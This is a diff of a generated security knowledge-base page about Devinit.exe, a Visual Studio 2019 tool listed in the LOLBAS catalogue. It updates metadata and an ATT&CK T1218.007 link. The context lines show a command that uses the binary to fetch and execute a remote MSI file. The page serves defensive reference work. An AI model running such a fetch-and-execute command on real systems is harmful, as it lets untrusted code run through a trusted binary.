@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/Devinit.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devinit.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "Devinit.exe"
@@ -19,16 +19,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Devinit.exe
-
 Visual Studio 2019 tool
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2022-01-20
-- Author: mr.d0x
-- Source Path: yml/OtherMSBinaries/Devinit.yml
 
 ## Paths
 
@@ -48,7 +39,7 @@ devinit.exe run -t msi-install -i {REMOTEURL:.msi}
 - Use Case: Executes code from a (remote) MSI file.
 - Privileges: User
 - Operating System: Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.007]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]
 
 ## Detections
 
